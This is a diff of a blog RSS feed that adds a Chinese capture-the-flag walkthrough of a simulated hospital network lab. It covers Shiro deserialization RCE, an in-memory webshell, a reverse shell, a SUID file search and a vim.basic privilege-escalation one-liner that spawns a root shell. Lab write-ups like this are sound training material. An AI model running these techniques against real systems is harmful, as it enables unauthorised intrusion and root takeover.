@@ -26,7 +26,9 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;先下载fscan。https://github.com/shadow1ng/fscan/releases/tag/1.8.4&lt;/p&gt;
+&lt;/div&gt;&lt;h1 id=&#34;flag1&#34;&gt;flag1
+&lt;/h1&gt;&lt;h2 id=&#34;shiro反序列化rce&#34;&gt;shiro反序列化RCE
+&lt;/h2&gt;&lt;p&gt;先下载fscan。https://github.com/shadow1ng/fscan/releases/tag/1.8.4&lt;/p&gt;
 &lt;p&gt;扫描得到&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://luo-kaihong.github.io/p/2025-hospital/image-20250612221343251.png&#34;
 	width=&#34;1871&#34;
@@ -71,7 +73,80 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;java -jar shiro_attack-2.2.jar
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;</description>
+&lt;/div&gt;&lt;p&gt;打入内存马后冰蝎连接（冰蝎连接时脚本选择jsp，php不行，蚁剑连接也是一样shell文件后缀是jsp，但是我的蚁剑shell文件类型没有jsp所以连不上）&lt;/p&gt;
+&lt;img src=&#34;image-20250617210828756.png&#34; alt=&#34;image-20250617210828756&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;p&gt;利用冰蝎反弹shell&lt;/p&gt;
+&lt;img src=&#34;image-20250617213919451.png&#34; alt=&#34;image-20250617213919451&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;p&gt;然后查找具有root权限的SUID的文件&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find / -user root -perm -4000 -print 2&amp;gt;/dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;img src=&#34;image-20250617214113248.png&#34; alt=&#34;image-20250617214113248&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;p&gt;发现vim有suid权限&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://gtfobins.github.io/gtfobins/vim/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;vim | GTFOBins&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;非预期直接猜到flag位置&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vim /root/flag/flag01.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;img src=&#34;image-20250617214419741.png&#34; alt=&#34;image-20250617214419741&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;h2 id=&#34;预期vimbasic提权升级交互式终端&#34;&gt;预期：vim.basic提权：升级交互式终端
+&lt;/h2&gt;&lt;p&gt;升级交互式终端，以欺骗某些命令让它们以为在合适的终端运行,vim.basic有suid权限，但是必须有tty，也就是交互式shell&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 -c &amp;#34;import pty;pty.spawn(&amp;#39;/bin/bash&amp;#39;)&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;完整的命令本来是&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 -c &amp;#34;import pty;pty.spawn(&amp;#39;/bin/bash&amp;#39;)&amp;#34;	
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;script /dev/null -c bash
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ctrl+z
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;stty raw -echo; fg
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;reset
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;xterm-256color
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://saucer-man.com/information_security/233.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;实现交互式shell的几种方式 - yanq的个人博客&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;然后suid提权就有了root权限&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/bin/vim.basic  -c &amp;#39;:python3 import os; os.execl(&amp;#34;/bin/sh&amp;#34;, &amp;#34;sh&amp;#34;, &amp;#34;-pc&amp;#34;, &amp;#34;reset; exec sh -p&amp;#34;)&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;img src=&#34;image-20250617230628561.png&#34; alt=&#34;image-20250617230628561&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;p&gt;这个思路是看这个&lt;a class=&#34;link&#34; href=&#34;https://aniale.top/article/yiyo9zcb/#web01&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;春秋云镜-Hospital | aniale&amp;rsquo;s blog&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;本来是看&lt;a class=&#34;link&#34; href=&#34;https://chimedal.github.io/2024/09/30/Hospital/index.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;春秋云境-Hospital&lt;/a&gt;，&lt;a class=&#34;link&#34; href=&#34;https://lca.xlog.app/chun-qiu-yun-jing-fang-zhen-ba-chang-Hospital-shi-cao?locale=zh&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;春秋云镜仿真靶场Hospital实操 - lca&lt;/a&gt;这两篇，交互终端后添加一个拥有root的hacker账户，但是不知道为啥云服务器上编辑这个/etc/passwd有点问题（编辑云服务器的/etc/passwd可以，题目的不行），所以就直接提权拿flag了&lt;/p&gt;
+</description>
         </item>
         
     </channel>
